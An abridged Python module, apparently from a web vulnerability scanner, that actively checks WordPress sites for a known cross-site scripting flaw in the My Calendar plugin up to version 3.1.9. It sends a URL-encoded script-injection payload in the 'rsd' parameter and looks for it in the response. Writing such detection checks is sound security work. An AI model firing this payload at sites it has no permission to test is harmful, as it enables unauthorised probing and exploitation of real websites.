#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress plugin My Calendar <= 3."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress My Calendar <= 3.1.9 - Cross-Site Scripting Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'wordpress', 'xss', 'wp-plugin', 'wpscan', 'my_calendar_project', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        ...
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('My Calendar', 'Tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        ...
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress My Calendar <= 3.1.9 - Cross-Site Scripting detected', path=path)
            return True
        return False
